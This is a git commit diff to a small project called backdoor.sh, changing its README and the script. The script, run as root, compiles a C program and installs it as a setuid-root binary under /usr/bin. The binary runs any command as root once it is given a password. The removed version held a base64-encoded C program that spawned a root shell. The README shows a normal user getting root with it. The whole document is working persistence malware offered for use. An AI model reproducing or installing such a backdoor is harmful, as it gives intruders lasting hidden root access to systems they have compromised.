6eebedf09af3425db462b4036bc04464d9574e85
bl33dz <fcb775566@gmail.com>
2018-06-03 06:23:29 +0700

    update

--- README.md
+++ README.md
@@ -3,7 +3,20 @@
 Usage:
 ```
 # chmod +x backdoor.sh
-# ./backdoor.sh
+# ./backdoor.sh <backdoor> <password>
 ```
 
-As non-root user run command ```root``` or ```/usr/bin/root```
+As non-root user run:
+```
+$ <backdoor> <password> <command>
+```
+
+Example:
+```
+root@machine:~# ./backdoor.sh root bl33dz
+root@machine:~# su user
+user@machine:~$ whoami
+user
+user@machine:~$ root bl33dz whoami
+root
+```
--- backdoor.sh
+++ backdoor.sh
@@ -7,17 +7,44 @@ if [ $(id -u) != 0 ]; then
 	exit
 fi
 
-echo "I2luY2x1ZGU8c3RkaW8uaD4KI2luY2x1ZGU8dW5pc3RkLmg+CiNpbmNsdWRlPHN0ZGxpYi5oPgoKaW50IG1haW4odm9pZCkgewoJc2V0dWlkKDApOwoJc2V0Z2lkKDApOwoJc3lzdGVtKCIvYmluL2Jhc2giKTsKfQo=" | base64 -d > /tmp/root.c
+if [ ! $1 ] || [ ! $2 ]; then
+	echo "usage: $0 <backdoor_filename> <password>"
+	exit
+fi
+
+cat > /tmp/root.c << EOF
+#include<stdio.h>
+#include<unistd.h>
+#include<string.h>
+#include<stdlib.h>
+
+int main(int argc, char *argv[]) {
+	if(argv[1] && argv[2]) {
+		char pass[] = "$2";
+		if(strcmp(argv[1], pass) == 0) {
+			setuid(0);
+			setgid(0);
+			system(argv[2]);
+		} else {
+			printf("Err: wrong password!\n");
+		}
+	} else {
+		printf("Usage: %s <password> <command>\n", argv[0]);
+	}
+	return 0;
+}
+EOF
+
 if [ -f /tmp/root.c ]; then echo "[+] /tmp/root.c created"; else echo "[-] can't create /tmp/root.c"; exit; fi
 
 if [ -x $(command -v gcc) ]; then echo "[+] gcc found"; else echo "[-] gcc not found"; exit; fi
 gcc /tmp/root.c -o /tmp/root
 rm -rf /tmp/root.c
 
-mv /tmp/root /usr/bin/root
-chmod +x /usr/bin/root
-chmod +s /usr/bin/root
-if [ -x /usr/bin/root ]; then echo "[+] /usr/bin/root created and executable"; else echo "[-] /usr/bin/root not created or not executable"; exit; fi
+mv /tmp/root /usr/bin/$1
+chmod +x /usr/bin/$1
+chmod +s /usr/bin/$1
+if [ -x /usr/bin/$1 ]; then echo "[+] /usr/bin/$1 created and executable"; else echo "[-] /usr/bin/$1 not created or not executable"; exit; fi
 
 echo "[+] done"
-echo -e "\nrun command \"root\" or \"/usr/bin/root\" as non-root user"
+echo -e "\nrun command \"$1\" or \"/usr/bin/$1\" as non-root user"
